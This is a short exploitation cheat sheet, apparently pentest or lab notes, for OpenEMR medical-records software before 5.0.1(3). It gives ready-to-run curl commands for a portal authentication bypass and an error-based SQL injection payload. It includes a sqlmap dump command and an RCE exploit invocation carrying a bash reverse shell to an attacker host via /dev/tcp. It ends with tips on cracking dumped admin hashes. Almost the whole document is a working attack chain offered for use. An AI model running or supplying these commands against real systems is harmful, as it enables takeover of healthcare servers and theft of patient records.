# OpenEMR Auth Bypass + SQLi + RCE

OpenEMR before 5.0.1(3) has multiple vulnerabilities: an authentication bypass via the patient portal registration flow, SQL injection in authenticated pages, and authenticated RCE via file upload.

## Authentication Bypass

```bash
# Step 1: Visit patient portal registration to set a "logged-in" session
curl -c cookies.txt "http://<TARGET>/portal/account/register.php"

# Step 2: Access protected pages using that session (within ~10 min)
curl -b cookies.txt "http://<TARGET>/portal/add_edit_event_user.php?eid=1"
```

## SQL Injection (after auth bypass)

```bash
# Error-based test
curl -b cookies.txt "http://<TARGET>/portal/add_edit_event_user.php?eid=1%20AND%20EXTRACTVALUE(0,CONCAT(0x5c,VERSION()))"

# sqlmap (save Burp request with auth cookies first)
sqlmap -r openemr.request --level 3 --risk 2 --dump
```

## Authenticated RCE (CVE-2018-15142 / EDB-45161)

```bash
# Install / use exploit script (requires admin creds from SQLi dump)
python openemr-rce.py \
  -u <admin_username> \
  -p <password> \
  -c 'bash -c "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"' \
  http://<TARGET>
```

## Notes
- Affects OpenEMR < 5.0.1(3) — version visible on login page
- Path: usually `/openemr/` or `/hms/`
- Auth bypass: visit `/portal/account/register.php` first, then access portal pages directly
- Admin hash from SQLi → crack with hashcat `-m 3200` (bcrypt) or `-m 0` (MD5)
- RCE requires valid admin credentials but no separate privilege
